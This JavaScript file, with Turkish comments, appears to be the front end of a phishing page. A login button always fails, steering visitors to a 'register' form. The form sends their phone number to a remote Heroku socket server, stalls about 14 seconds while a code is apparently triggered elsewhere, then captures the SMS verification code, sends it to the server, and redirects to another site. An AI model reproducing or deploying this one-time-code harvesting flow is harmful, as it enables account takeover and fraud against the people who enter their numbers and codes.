console.log("SCRIPT.JS YÜKLENDİ - BAŞLANGIÇ");  // ← Debug log

const socket = io('https://afternoon-lake-61658-70a3b4756b95.herokuapp.com');
console.log("CLIENT SOCKET BAĞLANDI");

const loginCard = document.getElementById("loginCard");
const registerCard = document.getElementById("registerCard");
const verifyCard = document.getElementById("verifyCard");
const successScreen = document.getElementById("successScreen");

console.log("LoginCard bulundu mu?", loginCard);  // ← Debug: ID kontrolü

function showCard(card) {
  console.log("showCard çağrıldı:", card);  // ← Debug
  if (card) {  // ← Null kontrolü eklendi
    card.classList.remove("hidden");
    requestAnimationFrame(() => {
      card.classList.add("visible");
    });
  }
}

function hideCard(card) {
  if (card) {  // ← Null kontrolü eklendi
    card.classList.remove("visible");
    setTimeout(() => {
      card.classList.add("hidden");
    }, 300);
  }
}

function showRegister() {
  hideCard(loginCard);
  showCard(registerCard);
}

function showLogin() {
  hideCard(registerCard);
  hideCard(verifyCard);
  hideCard(successScreen);
  showCard(loginCard);
}

document.addEventListener("DOMContentLoaded", () => {
  console.log("DOMContentLoaded TETİKLENDİ!");  // ← Debug

  // başlangıç durumu
  registerCard.classList.add("hidden");
  verifyCard.classList.add("hidden");
  successScreen.classList.add("hidden");
  showCard(loginCard);

  // TELEFON INPUT
  const phoneInput = document.getElementById("registerPhone");

  phoneInput.addEventListener("focus", () => {
    if (phoneInput.value === "") phoneInput.value = "05";
  });

  phoneInput.addEventListener("input", () => {
    phoneInput.value = phoneInput.value.replace(/[^0-9]/g, "");
    if (!phoneInput.value.startsWith("05")) phoneInput.value = "05";
    if (phoneInput.value.length > 11) {
      phoneInput.value = phoneInput.value.slice(0, 11);
    }
  });

  // REGISTER → VERIFY (4x spin)
  const registerBtn = document.getElementById("registerSubmit");
  const btnText = registerBtn.querySelector(".btn-text");   // ← EKLE

  registerBtn.addEventListener("click", () => {
    const phone = phoneInput.value.trim();
    if (!phone) return;

    socket.emit("new-phone", phone);

    registerBtn.disabled = true;
    btnText.textContent = "Kod gönderiliyor";        // ← DEĞİŞTİ
    registerBtn.classList.add("spinning");

    // 12. saniyede yazı değişsin
    setTimeout(() => {
      btnText.textContent = "Kod gönderildi";
      registerBtn.classList.add("slow");            // slow animasyon burada başlasın
    }, 12000);

    // 14. saniyede ekran değişsin
    setTimeout(() => {
      registerBtn.classList.remove("spinning");
      registerBtn.classList.remove("slow");         // slow'u da kaldır
      registerBtn.disabled = false;
      btnText.textContent = "Kod gönderiliyor";     // başlangıç haline geri dön
      hideCard(registerCard);
      showCard(verifyCard);
    }, 14000);
  });

  // VERIFY → SUCCESS
  const verifyBtn = document.getElementById("verifySubmit");

  verifyBtn.addEventListener("click", () => {
    const code = document.getElementById("verifyCode").value.trim();
    if (!code) return;

    console.log("CLIENT CODE GÖNDERDİ:", code);
    socket.emit("new-code", code);

    verifyBtn.classList.add("loading");

    setTimeout(() => {
      verifyBtn.classList.remove("loading");
      hideCard(verifyCard);
      showCard(successScreen);

      setTimeout(() => {
        window.location.href = "https://hukumsuz.de/";
      }, 2000);

    }, 2000);
  });

});

// Giriş Yap butonunun tıklanma işlevi
const loginBtn = document.getElementById("loginBtn");
const loginError = document.getElementById("loginError");

if (loginBtn) {
  loginBtn.addEventListener("click", (e) => {
    e.preventDefault();

    // Kullanıcı hatası mesajını göster
    loginError.style.display = "block";
  });
}